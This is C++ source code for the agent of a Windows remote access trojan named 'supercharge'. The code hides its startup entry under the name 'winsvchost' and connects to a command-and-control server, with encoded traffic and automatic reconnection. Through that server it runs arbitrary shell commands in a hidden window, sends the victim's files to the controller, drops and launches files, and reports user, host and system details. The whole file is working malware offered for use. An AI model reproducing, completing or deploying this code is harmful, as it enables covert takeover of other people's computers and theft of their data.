#include "supercharge.hpp"

bool supercharge::isUsbThreadRunning(){
	DWORD result = WaitForSingleObject( hThread, 0);
	if (result == WAIT_OBJECT_0) {
		return false;
	}
	else {
		return true;
	}
}

void supercharge::reconnect()
{
	closesocket(sockfd);
	WSACleanup();
	Sleep(INTERVAL);
	C2Connect();
}
void supercharge::startup()
{
	HKEY NewVal;
	wchar_t username[UNLEN +1];
	std::wstringstream pth;
    if (GetUserNameW(username, &len)) {
		std::wstring wstrusername(username);
		pth << L"C:\\Users\\" << wstrusername << L"\\AppData\\Roaming\\WindowsSuperCharge\\WindowsSuperCharge.exe"; 
    }

	std::wstring filepath = pth.str();
	RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal);
	RegSetValueExW(NewVal, L"winsvchost", 0, REG_SZ, (BYTE*)filepath.c_str(), (filepath.size()+1) * sizeof(wchar_t));
	RegCloseKey(NewVal);
}


void supercharge::Execute(char* toExecute)
{
	std::ostringstream error_reply;
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo; 
	char buf[500];
	memset(buf, '\0', 500);
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	snprintf(buf, 500, "cmd.exe /c %s", toExecute);
	if(!CreateProcess(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		error_reply.str("");
		error_reply.clear();
		error_reply << "Failed to Execute Command, Error Code : " << GetLastError();
		respond(error_reply.str().c_str()); 
	} else {
		respond("Command Executed.");
	}
}

void supercharge::ExecuteFile(char* filename)
{
	std::ostringstream error_reply;
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo; 
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	if(!CreateProcess((LPCSTR)filename, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &sinfo, &pinfo)){
		error_reply.str("");
		error_reply.clear();
		error_reply << "Failed to Create Process, Error Code : " << GetLastError();
		respond(error_reply.str().c_str()); 
	} else {
		respond("Command Executed.");
	}
}

std::string supercharge::AgentLocation()
{
	std::string filelocation;
	int fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
	if (fpath == 0)
	{
		filelocation = "Unknown (Failed to get)";
	}
	else {
		filelocation = DIR;
	}

	return filelocation;

}

std::string supercharge::USERPC()
{
	std::string userpc;
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	userpc = std::string(username) + " / " + std::string(hostname);
	return userpc;
}

std::string supercharge::ramsize(int mode)
{
	std::ostringstream rm;
	std::ostringstream vrm;
	std::string RAM, vRAM;
	MEMORYSTATUSEX memstatx;
	memstatx.dwLength = sizeof(memstatx);
	GlobalMemoryStatusEx(&memstatx);
	float ramsize = memstatx.ullTotalPhys / (1024 * 1024);
	float memVrsize = memstatx.ullTotalVirtual / (1024 * 1024);
	rm << ramsize;
	vrm << memVrsize;
	vRAM = vrm.str();
	RAM = rm.str();
	if(mode == 1){
		return RAM;
	} else{
		return vRAM;
	}
}

// Thanks to @dannyvsdev / https://github.com/quantumcore/supercharge/issues/1
std::string supercharge::OS()
{
	std::string os;
	std::ostringstream ds;
	int ret = 0.0;
	NTSTATUS(WINAPI *RtlGetVersion)(LPOSVERSIONINFOEXW);
	OSVERSIONINFOEXW osInfo;

	*reinterpret_cast<FARPROC*>(&RtlGetVersion) = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

	if (nullptr != RtlGetVersion)
	{
		osInfo.dwOSVersionInfoSize = sizeof osInfo;
		RtlGetVersion(&osInfo);
		ret = osInfo.dwMajorVersion;
	}

	int mw = osInfo.dwMinorVersion;
	if(ret == 5){
		switch (mw)
		{
		case 0:
			os = "Windows 2000";
			break;
		case 1:
			os = "Windows XP";
			break;
		
		case 2:
			os = "Windows XP Professional";
			break;
		
		default:
			ds.str(""); ds.clear(); 
			ds << "Windows " << mw;
			os = ds.str();
			break;
		}
	} else if(ret == 6){
		switch (mw)
		{
		case 0:
			os = "Windows Vista";
			break;
		case 1:
			os = "Windows 7";
			break;
		case 2:
			os = "Windows 8";
			break;
		case 3:
			os = "Windows 8.1";
			break;
		
		default:
			ds.str(""); ds.clear(); 
			ds << "Windows " << mw;
			os = ds.str();
			break;
		}
	} else if(ret == 10){
			os = "Windows 10";
	} else {
		ds.str(""); ds.clear(); 
		ds << "Windows " << mw;
		os = ds.str();
	}
	return os;
}


void supercharge::recvFile()
{
	int fsize;
	std::string response;
	std::ofstream recvfile(file_commands[1], std::ios::app | std::ios::binary);
	while ((fsize = recv(sockfd, filebuf, sizeof(filebuf), 0)) > 0)
	{
		recvfile.write(filebuf, sizeof(filebuf));
	}
	recvfile.close();
	response = "Saved '" + std::string(file_commands[1]) + "' Under " + std::string(cDir());
	respond(response.c_str());

}

void supercharge::Wanip()
{
	HINTERNET hInternet, hFile;
	DWORD rSize;
	if(InternetCheckConnection("http://www.google.com", 1, 0)){
		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		hFile = InternetOpenUrl(hInternet, _T("http://bot.whatismyipaddress.com/"), NULL, 0, INTERNET_FLAG_RELOAD, 0);
		InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
		wanip[rSize] = '\0';

		InternetCloseHandle(hFile);
		InternetCloseHandle(hInternet);
	} else {
		memset(wanip, '\0', 500);
		snprintf(wanip, 500, "No Internet Detected");
	}
	
}

// Split string using C Method. 
void supercharge::strsplit(char src[500], char* dest[5]) {
	int i = 0;
	char *p = strtok(src, "=");
	while (p != NULL)
	{
		dest[i++] = p;
		p = strtok(NULL, "=");
	}
}

void supercharge::ConnectionManage()
{
	while (connected)
	{
		// Password Protection 
		memset(password_buf, '\0', MAX_PASSWORD);
		if(strlen(password_buf) <= 0)
		{
			int pass = recv(sockfd, password_buf, MAX_PASSWORD, 0);
			std::string rXORbuf(password_buf);
			std::string cmpMe = XOR(rXORbuf);
			if(strcmp(cmpMe.c_str(), PASSWORD) == 0) {
				authenticated = true; 
				respond("Password Accepted.");
			}
			else { 
				respond("INCORRECT PASSWORD.");
				connected = false; 
				break; 
			}
		}

		while(connected && authenticated){
			// std::cout << "Started commmand execution." << std::endl;
			//respond("Password Accepted.");
			memset(recvbuf, '\0', BUFFER);
			int resc = recv(sockfd, recvbuf, BUFFER, 0);
			if (resc == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
			{
				connected = false;
			}
			std::string decX(recvbuf);
			std::string command = XOR(decX);
			char toSplit[BUFFER];
			memset(toSplit, '\0', BUFFER);
			strncpy(toSplit, command.c_str(), sizeof(toSplit));
			if (command == "test")
			{
				respond("Connection is ok!");
			}
			else if (command == "os")
			{
				respond(OS().c_str());
			} else if(command == "wanip")
			{
				Wanip();
				std::string WideAreaIP = wanip;
				respond(WideAreaIP.c_str());
			} else if(command == "processors"){
				respond(basicinfo(PROCESSORS).c_str());
			} else if(command == "pagesize"){
				respond(basicinfo(PAGESIZE).c_str());
			} else if(command == "minappaddr"){
				respond(basicinfo(minAppAddr).c_str());
			} else if(command == "maxappaddr"){
				respond(basicinfo(maxAppAddr).c_str());
			}
			else if(command == "ramsize")
			{
				respond(ramsize(1).c_str());
			} else if(command == "vramsize"){
				respond(ramsize(0).c_str());	
			} 
			else if(command == "agent")
			{
				respond(AgentLocation().c_str());
			} else if(command == "userpc")
			{
				respond(USERPC().c_str());
			} else if(command == "id")
			{
				respond("BOT");
			} 
			else if(command.find("cd") != std::string::npos)
			{
				memset(dir_commands, '\0', 5);
				std::string reply;
				strsplit(toSplit, dir_commands);
				// This should be like. 
				// dir_commands = {'cd', 'test'};
				std::ostringstream rs;
				if(changeDirectory(dir_commands[1]) == OKCODE) // 21
				{
					rs << "Directory changed to " << cDir();
					respond(rs.str().c_str());
				} else {
					int lastError = changeDirectory(dir_commands[1]); 
					if(lastError == 0){
						
						
					} else if(lastError == 1){
						respond("Incorrect function. (1)");
					} else if(lastError == 2){
						respond("File not found.(2)");
					} else if(lastError == 3){
						respond("Path not found.(3)");
					} else if(lastError == 4){
						respond("Cannot open file.(4)");
					} else if(lastError == 5){
						respond("Access Denied. (5)");
					} else {
						std::ostringstream lerrs;
						lerrs << "Error : " << lastError;
						respond(lerrs.str().c_str());
					}
						
				}
			} else if(command == "usb.thread"){
				if(isUsbThreadRunning() == false)
				{
					std::ostringstream lsterror;
					lsterror << "Thread not Running. Last Error : " << GetLastError();
					respond(lsterror.str().c_str());
				} else {
					respond("Thread running.");
				}
			}
			else if (command.find("recvthis") != std::string::npos)
			{
				memset(file_commands, '\0', 5);
				memset(filebuf, '\0', BUFFER);
				strsplit(toSplit, file_commands);
				recvFile();
				
			} else if(command == "windowname")
			{
				respond(current_window().c_str());
			}

			else if(command.find("sendme") != std::string::npos)
			{
				memset(fcommands, '\0', 5);
				strsplit(toSplit, fcommands);

				FILE * fs;
				std::ostringstream test;
				if((fs = fopen(fcommands[1], "rb")) != NULL){
                    
                    std::string trigger = "savethis=" + std::string(fcommands[1]);
					respond(trigger.c_str());
                    char fbuffer[500];
                    memset(fbuffer, '\0', 500);
                    //size_t rret, wret;
                    int bytes_read;
                    while(!feof(fs)){
                        if((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0){
                            send(sockfd, fbuffer, bytes_read, 0);
                        } else {
                            break;
                        }
                    }
                    fclose(fs);
                } else {
                    respond("File not found.");
                }
			} 
			else if (command == "wanip") {
				respond((const char*)wanip);
			} 
			else if (command.find("msgbox") != std::string::npos)
			{
				memset(msgbox, '\0', 5);
				strsplit(toSplit, msgbox);
				respond("Messagebox displayed.");
				// blocks
				MessageBox(NULL, msgbox[1], msgbox[2], MB_ICONINFORMATION);
				respond("Messagebox Closed.");
			}
			// // exec [ Hidden Execution of an Application ]
			else if (command.find("exec") != std::string::npos) {
				memset(fcommands, '\0', 5);
				strsplit(toSplit, fcommands);
				ExecuteFile(fcommands[1]);
			} else if(command.find("cmd") != std::string::npos){
				memset(fcommands, '\0', 5);
				strsplit(toSplit, fcommands);
				Execute(fcommands[1]);
			}
			else if(command == "creds")
			{
				respond("Not added yet :(");
			}
			else if (command == "hostname")
			{
				respond(hostname);
			}
			else if (command == "username")
			{
				respond(username);
			}
			else if (command == "kill")
			{
				respond("Disconnect Requested. Disconnecting.");
				connected = false;
				break;
			} 
			else if(command == "cfolder") // cfolder = Current folder
			{
				respond((char*)cDir());
			}
			else if(command == "ls")
			{
				std::ostringstream files;
				std::ostringstream ftype;
				std::string strfiles;
				HANDLE hFind = FindFirstFile("*", &data);
				if(hFind != INVALID_HANDLE_VALUE){
					do{
						ftype << data.cFileName;
						if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
							files << "\n[DIRECTORY] " << data.cFileName;
						} else {
							files << "\n[FILE] " << data.cFileName;
						}
					} while(FindNextFile(hFind, &data));
				} else {
					respond("Failed to get Files in directory.\n");
				}

				strfiles = "\nFiles in " + std::string(cDir()) + "\n---------------\n" + files.str();
				respond(strfiles.c_str());
			}
			
		}
	}

	if (!connected)
	{
		reconnect();
	}
}

void supercharge::respondF(const char* data)
{
	int totalsent = 0;
	int lerror = WSAGetLastError();
	int buflen = strlen(data);
	while (buflen > totalsent) {
		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
		if (lerror == WSAECONNRESET)
		{
			connected = false;
		}
		if (r < 0) return;
		totalsent += r;
	}
	return;
}

/* Send Data to C&C */
void supercharge::respond(const char * data) {
	int totalsent = 0;
	std::string a = std::string(data);
	std::string encData = XOR(a);
	const char* finalData = encData.c_str();
	int lerror = WSAGetLastError();
	int buflen = strlen(data);
	while (buflen > totalsent) {
		int r = send(sockfd, finalData + totalsent, buflen - totalsent, 0);
		if (lerror == WSAECONNRESET)
		{
			connected = false;
		}
		if (r < 0) return;
		totalsent += r;
	}
	return;
}

void supercharge::C2Connect()
{
	while (true)
	{
		WSADATA wsa;
		DWORD timeout = 1000;
		if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return; };
		sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
		{
			// std::cout << "Failed to Create Socket : " << WSAGetLastError() << std::endl;
			// exit(1);
			return;
		}
		setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

		server.sin_addr.s_addr = inet_addr(SERVER_HOST);
		server.sin_port = htons(SERVER_PORT);
		server.sin_family = AF_INET;

		do {
			if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
				// std::cout << "Connection failed : " << WSAGetLastError() << std::endl;
				reconnect();
			}
			else {
				connected = true;
				// std::cout << "Connection Established." << std::endl;
			}
		} while (!connected); // Not Connected, While not connected.

		ConnectionManage();
	}

}
